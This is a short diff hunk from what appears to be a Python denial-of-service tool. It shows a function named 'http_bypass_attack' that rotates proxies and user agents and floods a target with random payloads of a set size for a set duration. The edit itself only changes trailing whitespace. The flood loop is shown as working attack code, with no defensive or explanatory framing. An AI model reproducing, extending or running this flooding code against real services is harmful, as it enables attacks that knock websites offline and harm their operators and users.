@@ -6,7 +6,7 @@ def http_bypass_attack(target, proxies, user_agents, duration, packet_size, pack
     bot = HTTPBot(proxies, user_agents)
     end_time = time.time() + duration
     while time.time() < end_time:
-        start_time = time.time()
+        start_time = time.time()  
         payload = random_string(packet_size * 1024)  
         bot.send_request(target, payload)
         elapsed_time = time.time() - start_time  
